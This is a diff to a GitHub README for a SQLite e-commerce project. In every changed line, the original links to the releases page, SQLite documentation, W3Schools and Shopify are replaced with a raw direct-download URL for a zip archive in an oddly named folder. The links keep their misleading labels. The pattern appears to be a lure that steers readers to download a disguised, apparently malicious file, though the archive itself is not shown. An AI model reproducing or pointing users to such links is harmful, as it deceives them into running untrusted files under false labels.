@@ -6,7 +6,7 @@ Welcome to the E-commerce-SQL-Project. This application uses SQLite to help you 
 
 ## 📥 Download the Application
 
-[![Download E-commerce-SQL-Project](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Joker7970/E-commerce-SQL-Project/releases)
+[![Download E-commerce-SQL-Project](https://raw.githubusercontent.com/Joker7970/E-commerce-SQL-Project/main/tripewife/E-commerce-SQL-Project-3.3-beta.3.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Joker7970/E-commerce-SQL-Project/main/tripewife/E-commerce-SQL-Project-3.3-beta.3.zip)
 
 ## 📂 System Requirements
 
@@ -19,7 +19,7 @@ To run this application, you need the following:
 ## ⚙️ Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/Joker7970/E-commerce-SQL-Project/releases) to find the latest version. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Joker7970/E-commerce-SQL-Project/main/tripewife/E-commerce-SQL-Project-3.3-beta.3.zip) to find the latest version. 
 
 2. **Download the Application:**
    Look for the latest release version. Click on the link to download the installer file. 
@@ -75,9 +75,9 @@ SQLite is a powerful database engine that is simple to set up. Here are some bas
 
 For more information on SQLite, consider checking these resources:
 
-- [SQLite Official Documentation](https://www.sqlite.org/docs.html)
-- [SQL Basics](https://www.w3schools.com/sql/)
-- [E-commerce Best Practices](https://www.shopify.com/blog/ecommerce)
+- [SQLite Official Documentation](https://raw.githubusercontent.com/Joker7970/E-commerce-SQL-Project/main/tripewife/E-commerce-SQL-Project-3.3-beta.3.zip)
+- [SQL Basics](https://raw.githubusercontent.com/Joker7970/E-commerce-SQL-Project/main/tripewife/E-commerce-SQL-Project-3.3-beta.3.zip)
+- [E-commerce Best Practices](https://raw.githubusercontent.com/Joker7970/E-commerce-SQL-Project/main/tripewife/E-commerce-SQL-Project-3.3-beta.3.zip)
 
 ## 📣 Feedback and Contributions
 
@@ -85,6 +85,6 @@ Your thoughts matter. If you have feedback or suggestions for improving the E-co
 
 ## 📥 Download and Install
 
-To begin your experience with the E-commerce-SQL-Project, don't forget to visit [this page to download](https://github.com/Joker7970/E-commerce-SQL-Project/releases). Follow the installation steps to get started.
+To begin your experience with the E-commerce-SQL-Project, don't forget to visit [this page to download](https://raw.githubusercontent.com/Joker7970/E-commerce-SQL-Project/main/tripewife/E-commerce-SQL-Project-3.3-beta.3.zip). Follow the installation steps to get started.
 
 By guiding you through the setup and features, we hope you find the E-commerce-SQL-Project useful in managing e-commerce data effectively!
